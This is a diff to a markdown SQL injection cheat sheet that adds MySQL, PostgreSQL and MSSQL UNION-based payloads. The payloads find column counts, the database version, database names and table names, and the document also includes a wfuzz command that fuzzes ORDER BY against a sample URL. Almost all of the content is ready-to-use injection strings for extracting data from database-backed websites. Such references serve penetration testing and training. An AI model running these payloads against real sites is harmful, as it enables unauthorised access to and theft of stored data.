@@ -6,7 +6,9 @@
 
 Alternatively, you can use BurpSuite Intruder with SQLi wordlists as well.
 
-### 2) Find number of columns in the table
+### 2) Find the number of columns in the table
+
+MySQL
 
 Repeat this input until you get a response from the server
 
@@ -17,19 +19,46 @@ Repeat this input until you get a response from the server
     ' UNION SELECT 1,2,3,4,5 #
     ' UNION SELECT 1,2,3,4,5,6 #
 
+PostgreSQL
+
+    ' UNION SELECT NULL
+    ' UNION SELECT NULL,NULL #
+    ' UNION SELECT NULL,NULL,NULL #
+    ' UNION SELECT NULL,NULL,NULL,NULL #
+    ' UNION SELECT NULL,NULL,NULL,NULL,NULL #
+    ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL #
+    
 Automated
 
     wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ"
 
 ### 3) Find DB Version
 
+MySQL
+
+    ' UNION SELECT 1,2,3,4,5,version()
+
+MSSQL
+
     ' UNION SELECT 1,2,3,4,5,@@version #
 
-### 4) Find DB names
+PostgreSQL
+
+    ' UNION SELECT NULL,NULL,NULL,NULL,NULL,version()
+
+### 4) Find Databases
+
+MySQL
 
     ' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #
 
+PostgreSQL
+
+    ' union select 1,2,3,4,5, datname from pg_database
+
 ### 5) Find tables names (DB=Users)
+
+
 
     ' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Users' #
 
